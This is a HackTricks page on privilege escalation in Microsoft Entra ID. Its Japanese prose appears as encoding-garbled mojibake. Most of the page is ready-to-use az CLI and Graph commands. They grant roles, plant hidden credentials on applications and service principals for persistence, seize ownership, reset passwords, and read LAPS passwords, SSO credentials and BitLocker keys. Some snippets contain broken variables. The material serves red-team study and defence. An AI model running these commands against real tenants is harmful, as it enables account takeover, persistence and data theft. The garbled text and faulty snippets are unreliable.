# Az - EntraID Privesc

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

{% hint style="info" %}
**Entra ID**ã«çµ„ã¿è¾¼ã¾ã‚Œã¦ã„ã‚‹**ã™ã¹ã¦ã®è©³ç´°ãªæ¨©é™**ãŒã‚«ã‚¹ã‚¿ãƒ ãƒ­ãƒ¼ãƒ«ã§ä½¿ç”¨ã§ãã‚‹ã‚ã‘ã§ã¯ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

## ãƒ­ãƒ¼ãƒ«

### ãƒ­ãƒ¼ãƒ«ï¼šç‰¹æ¨©ãƒ­ãƒ¼ãƒ«ç®¡ç†è€… <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

ã“ã®ãƒ­ãƒ¼ãƒ«ã«ã¯ã€ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«ãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦ã€ãƒ­ãƒ¼ãƒ«ã«ã‚ˆã‚Šå¤šãã®æ¨©é™ã‚’ä¸ãˆã‚‹ãŸã‚ã«å¿…è¦ãªè©³ç´°ãªæ¨©é™ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ä¸¡æ–¹ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦ã‚‹ï¼š
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* ãƒ­ãƒ¼ãƒ«ã«ã•ã‚‰ã«æ¨©é™ã‚’è¿½åŠ ã™ã‚‹:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³

### `microsoft.directory/applications/credentials/update`

ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯æ—¢å­˜ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**è³‡æ ¼æƒ…å ±**ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¾ãŸã¯è¨¼æ˜æ›¸ï¼‰ã‚’è¿½åŠ ã§ãã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ç‰¹æ¨©ã®ã‚ã‚‹æ¨©é™ãŒã‚ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã—ã¦èªè¨¼ã—ã€ãã®æ¨©é™ã‚’å–å¾—ã§ãã¾ã™ã€‚
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

ã“ã‚Œã¯ `applications/credentials/update` ã¨åŒã˜ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã—ã¾ã™ãŒã€å˜ä¸€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚¹ã‚³ãƒ¼ãƒ—ã•ã‚Œã¦ã„ã¾ã™ã€‚
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**èª¬æ˜**: ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ‰€æœ‰è€…ã‚’æ›´æ–°ã™ã‚‹\
**æ‚ªç”¨ã®å¯èƒ½æ€§**: è‡ªåˆ†è‡ªèº«ã‚’æ‰€æœ‰è€…ã¨ã—ã¦è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ“ä½œã§ãã€è³‡æ ¼æƒ…å ±ã‚„æ¨©é™ã‚’å«ã‚€ã€‚
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«

### `microsoft.directory/servicePrincipals/credentials/update`

ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯æ—¢å­˜ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«è³‡æ ¼æƒ…å ±ã‚’è¿½åŠ ã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«æ˜‡æ ¼ã—ãŸæ¨©é™ãŒã‚ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã®æ¨©é™ã‚’å¼•ãç¶™ãã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
æ–°ã—ãç”Ÿæˆã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ã‚¦ã‚§ãƒ–ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œãªã„ãŸã‚ã€ã“ã‚Œã¯ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«å¯¾ã—ã¦æŒç¶šæ€§ã‚’ç¶­æŒã™ã‚‹ãŸã‚ã®éš ã‚ŒãŸæ–¹æ³•ã¨ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
APIã‹ã‚‰ã¯æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

ã‚‚ã—ã‚¨ãƒ©ãƒ¼ `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."` ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆã€ãã‚Œã¯**SPã®passwordCredentialsãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ããªã„ãŸã‚**ã§ã‚ã‚Šã€æœ€åˆã«ãƒ­ãƒƒã‚¯ã‚’è§£é™¤ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®æ¨©é™ï¼ˆ`microsoft.directory/applications/allProperties/update`ï¼‰ãŒå¿…è¦ã§ã™:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯æ—¢å­˜ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«è³‡æ ¼æƒ…å ±ã‚’è¿½åŠ ã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«æ˜‡æ ¼ã—ãŸæ¨©é™ãŒã‚ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã®æ¨©é™ã‚’å¼•ãç¶™ãã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨åŒæ§˜ã«ã€ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’æ‰€æœ‰ã™ã‚‹ã“ã¨ã¯ã€ãã®è³‡æ ¼æƒ…å ±ã¨æ¨©é™ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
æ–°ã—ã„ã‚ªãƒ¼ãƒŠãƒ¼ã‚’è¿½åŠ ã—ãŸå¾Œã€å‰Šé™¤ã—ã‚ˆã†ã¨ã—ã¾ã—ãŸãŒã€APIã¯DELETEãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„ã¨å¿œç­”ã—ã¾ã—ãŸã€‚ã‚ªãƒ¼ãƒŠãƒ¼ã‚’å‰Šé™¤ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ¡ã‚½ãƒƒãƒ‰ã§ã‚ã£ã¦ã‚‚ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ç¾åœ¨ã‚ªãƒ¼ãƒŠãƒ¼ã‚’å‰Šé™¤ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` ã¨ `enable`

ã“ã‚Œã‚‰ã®æ¨©é™ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’ç„¡åŠ¹ã«ã—ãŸã‚Šæœ‰åŠ¹ã«ã—ãŸã‚Šã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã“ã®æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€ä½•ã‚‰ã‹ã®æ–¹æ³•ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’æœ‰åŠ¹ã«ã—ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æŠ€è¡“ã§ã¯ã€æ”»æ’ƒè€…ãŒæœ‰åŠ¹ã«ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’ä¹—ã£å–ã‚‹ãŸã‚ã«ã€ã•ã‚‰ã«å¤šãã®æ¨©é™ãŒå¿…è¦ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

ã“ã‚Œã‚‰ã®æ¨©é™ã¯ã€ã‚·ãƒ³ã‚°ãƒ«ã‚µã‚¤ãƒ³ã‚ªãƒ³ã®ãŸã‚ã®è³‡æ ¼æƒ…å ±ã‚’ä½œæˆãŠã‚ˆã³å–å¾—ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## ã‚°ãƒ«ãƒ¼ãƒ—

### `microsoft.directory/groups/allProperties/update`

ã“ã®æ¨©é™ã¯ã€ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚Šã¾ã™ã€‚
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**æ³¨æ„**: ã“ã®æ¨©é™ã¯ Entra ID ãƒ­ãƒ¼ãƒ«å‰²ã‚Šå½“ã¦ã‚°ãƒ«ãƒ¼ãƒ—ã‚’é™¤å¤–ã—ã¾ã™ã€‚

### `microsoft.directory/groups/owners/update`

ã“ã®æ¨©é™ã¯ã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚ªãƒ¼ãƒŠãƒ¼ã«ãªã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚ã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚ªãƒ¼ãƒŠãƒ¼ã¯ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã¨è¨­å®šã‚’åˆ¶å¾¡ã§ãã€ã‚°ãƒ«ãƒ¼ãƒ—ã«å¯¾ã—ã¦æ¨©é™ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**æ³¨æ„**: ã“ã®æ¨©é™ã¯ Entra ID ãƒ­ãƒ¼ãƒ«å‰²ã‚Šå½“ã¦ã‚°ãƒ«ãƒ¼ãƒ—ã‚’é™¤å¤–ã—ã¾ã™ã€‚

### `microsoft.directory/groups/members/update`

ã“ã®æ¨©é™ã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒ¡ãƒ³ãƒãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯è‡ªåˆ†è‡ªèº«ã‚„æ‚ªæ„ã®ã‚ã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€æ˜‡æ ¼ã—ãŸã‚¢ã‚¯ã‚»ã‚¹ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

ã“ã®æ¨©é™ã¯ã€å‹•çš„ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ãƒ«ãƒ¼ãƒ«ã‚’æ›´æ–°ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€æ˜ç¤ºçš„ãªè¿½åŠ ãªã—ã«ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ã«è‡ªåˆ†è‡ªèº«ã‚’å«ã‚ã‚‹ãŸã‚ã«å‹•çš„ãƒ«ãƒ¼ãƒ«ã‚’å¤‰æ›´ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**æ³¨æ„**: ã“ã®æ¨©é™ã¯ Entra ID ãƒ­ãƒ¼ãƒ«å‰²ã‚Šå½“ã¦ã‚°ãƒ«ãƒ¼ãƒ—ã‚’é™¤å¤–ã—ã¾ã™ã€‚

### ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã®ç‰¹æ¨©æ˜‡æ ¼

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè‡ªåˆ†ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã—ã¦ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã—ã¦è¿½åŠ ã•ã‚Œã‚‹ã“ã¨ã§ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ãªå ´åˆãŒã‚ã‚Šã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## ãƒ¦ãƒ¼ã‚¶ãƒ¼

### `microsoft.directory/users/password/update`

ã“ã®æ¨©é™ã¯ã€éç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒªã‚»ãƒƒãƒˆã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ½œåœ¨çš„ãªæ”»æ’ƒè€…ãŒä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

ã“ã®æ¨©é™ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£å€¤ã«åŸºã¥ã„ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã™ã‚‹å‹•çš„ã‚°ãƒ«ãƒ¼ãƒ—ãŒä¸€èˆ¬çš„ã«è¦‹ã‚‰ã‚Œã‚‹ãŸã‚ã€ã“ã®æ¨©é™ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç‰¹å®šã®å‹•çš„ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«ãªã‚‹ãŸã‚ã«å¿…è¦ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£å€¤ã‚’è¨­å®šã—ã€æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹ãƒãƒªã‚·ãƒ¼ã¨MFAãƒã‚¤ãƒ‘ã‚¹

MFAã‚’è¦æ±‚ã™ã‚‹èª¤è¨­å®šã•ã‚ŒãŸæ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹ãƒãƒªã‚·ãƒ¼ã¯ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## ãƒ‡ãƒã‚¤ã‚¹

### `microsoft.directory/devices/registeredOwners/update`

ã“ã®æ¨©é™ã¯ã€æ”»æ’ƒè€…ãŒãƒ‡ãƒã‚¤ã‚¹ã®æ‰€æœ‰è€…ã¨ã—ã¦è‡ªåˆ†è‡ªèº«ã‚’å‰²ã‚Šå½“ã¦ã€ãƒ‡ãƒã‚¤ã‚¹ç‰¹æœ‰ã®è¨­å®šã‚„ãƒ‡ãƒ¼ã‚¿ã¸ã®åˆ¶å¾¡ã¾ãŸã¯ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

ã“ã®æ¨©é™ã¯ã€æ”»æ’ƒè€…ãŒè‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ãƒ‡ãƒã‚¤ã‚¹ã«é–¢é€£ä»˜ã‘ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ãŸã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’å›é¿ã—ãŸã‚Šã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

ã“ã®æ¨©é™ã¯ã€æ”»æ’ƒè€…ãŒMicrosoft Entraã«å‚åŠ ã—ãŸãƒ‡ãƒã‚¤ã‚¹ã®ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ã•ã‚ŒãŸãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®è³‡æ ¼æƒ…å ±ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’èª­ã¿å–ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã¿ã¾ã™ã€‚ 

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

ã“ã®æ¨©é™ã¯BitLockerã‚­ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ”»æ’ƒè€…ãŒãƒ‰ãƒ©ã‚¤ãƒ–ã‚’å¾©å·åŒ–ã—ã€ãƒ‡ãƒ¼ã‚¿ã®æ©Ÿå¯†æ€§ã‚’ä¾µå®³ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## ãã®ä»–ã®èˆˆå‘³æ·±ã„æ¨©é™ (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
